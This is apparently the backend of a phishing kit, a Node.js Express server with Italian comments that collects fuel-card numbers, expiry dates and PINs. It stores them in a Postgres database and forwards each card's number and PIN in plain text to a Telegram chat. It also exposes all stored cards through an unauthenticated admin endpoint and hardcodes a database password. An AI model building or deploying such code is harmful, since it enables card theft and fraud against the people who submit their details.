const express = require('express');
const path = require('path');
const { Pool } = require('pg');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 4003;

// Database Supabase PostgreSQL
const pool = new Pool({
  connectionString: process.env.DATABASE_URL || 'postgresql://postgres:Juniorerose2026!@db.yqldnbuokputlkdqgqja.supabase.co:5432/postgres',
  ssl: { rejectUnauthorized: false }
});

// Telegram Bot
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Crea tabella all'avvio del server
async function initDB() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS carte_carburante (
        id SERIAL PRIMARY KEY,
        username VARCHAR(100),
        numero_carta VARCHAR(50),
        scadenza VARCHAR(10),
        pin VARCHAR(20),
        data_inserimento TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    console.log('✅ Database pronto');
  } catch (err) {
    console.error('Errore database:', err.message);
  }
}

// Invia notifica Telegram
async function sendTelegram(message) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
  } catch (err) {
    console.error('Errore Telegram:', err);
  }
}

// API: Salva carte carburante
app.post('/api/save-cards', async (req, res) => {
  const { username, cards } = req.body;
  
  if (!username || !cards || cards.length === 0) {
    return res.json({ success: false, message: 'Dati incompleti' });
  }
  
  try {
    // Salva nel database
    for (const card of cards) {
      await pool.query(
        'INSERT INTO carte_carburante (username, numero_carta, scadenza, pin) VALUES ($1, $2, $3, $4)',
        [username, card.number, card.expiry, card.pin]
      );
    }
    
    // Notifica Telegram
    let message = `🔔 <b>Nuovi dati carte carburante ricevuti!</b>\n\n`;
    message += `👤 <b>Username:</b> ${username}\n`;
    message += `📅 <b>Data:</b> ${new Date().toLocaleString('it-IT')}\n\n`;
    message += `💳 <b>Carte inserite:</b> ${cards.length}\n\n`;
    
    cards.forEach((card, index) => {
      message += `<b>Carta #${index + 1}</b>\n`;
      message += `   Numero: ${card.number}\n`;
      message += `   Scadenza: ${card.expiry}\n`;
      message += `   PIN: ${card.pin}\n\n`;
    });
    
    await sendTelegram(message);
    
    console.log(`✅ Salvate ${cards.length} carte per ${username}`);
    res.json({ success: true });
  } catch (err) {
    console.error('Errore salvataggio:', err);
    res.json({ success: false, message: 'Errore del server' });
  }
});

// API: Visualizza tutte le carte (per admin)
app.get('/api/admin/cards', async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM carte_carburante ORDER BY data_inserimento DESC');
    res.json({ success: true, cards: result.rows });
  } catch (err) {
    console.error('Errore recupero:', err);
    res.json({ success: false, message: 'Errore del server' });
  }
});

app.listen(PORT, async () => {
  console.log(`Server running on http://localhost:${PORT}`);
  await initDB();
});
